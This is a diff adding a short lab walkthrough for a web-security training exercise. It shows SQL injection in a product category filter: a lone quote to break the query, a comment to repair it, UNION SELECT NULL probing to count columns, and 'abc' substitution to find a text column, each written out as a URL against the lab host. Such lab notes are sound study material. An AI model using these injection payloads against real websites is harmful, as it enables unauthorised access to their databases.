@@ -1,0 +1,26 @@
+Objective: SQL injection UNION attack, finding a column containing text
+
+End Goal: Make a given text appear on the screen to confirm if a column is string.
+
+Step 1:
+Check for SQL vulnerablity in the category filter by adding '
+https://0ac1002403a47dc780b571ad002b008c.web-security-academy.net/filter?category='
+Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = '''
+Observation: you should get an Internal server error due to syntax violation
+
+Step2:
+Inject SQL while correcting syntax violation
+https://0ac1002403a47dc780b571ad002b008c.web-security-academy.net/filter?category='--
+Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = ''
+Observation: website should display the data normally
+
+Step3:
+Find the number of columns in the table with the help of UNION, and NULLs, it's trail and error. do it until you don't get internal server error.
+https://0ac1002403a47dc780b571ad002b008c.web-security-academy.net/filter?category=' UNION SELECT NULL, NULL--
+Observation: website should display internal server error
+
+Step4:
+Assuming you found the number of columns of the table from the previous Step,
+replace each NULL with a random text like 'abc', and see if it shows error, if error, replace the next NULL with text and try again
+https://0ac1002403a47dc780b571ad002b008c.web-security-academy.net/filter?category=' UNION SELECT NULL, 'abc', NULL--
+Observation: website will show internal server error when the text in the union doesn't match column in the table, else it should display the text.
